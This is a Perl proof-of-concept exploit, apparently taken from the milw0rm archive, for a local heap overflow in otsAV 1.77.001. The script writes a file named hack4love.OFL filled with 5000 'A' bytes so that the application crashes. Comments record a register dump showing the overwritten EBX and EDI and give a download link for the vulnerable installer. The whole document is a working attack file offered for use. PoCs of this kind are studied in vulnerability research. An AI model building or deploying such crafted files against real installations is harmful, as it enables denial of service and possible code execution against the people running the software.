#!/usr/bin/perl
# Found By :: HACK4LOVE
# otsAV 1.77.001 (.ofl File) Local Heap Overflow PoC
# http://x.download.otszone.com/static/otsavfreesetup.exe
########################################################################################
##EAX 0123BB48
##ECX 01130210
##EDX 01130160
##EBX 41414141
##ESP 0012F22C
##EBP 0012F448
##ESI 0123BB40
##EDI 41414141
##EIP 7C91B3FB ntdll.7C91B3FB
#######################################################################################
##Thanks for shar7abel elsafa7\linuxX\and all 3asfh team$$$$$$$$$$$$$
########################################################################################
my $crash="\x41" x 5000;
open(myfile,'>>hack4love.OFL');
print myfile $crash;
########################################################################################

# milw0rm.com [2009-07-22]
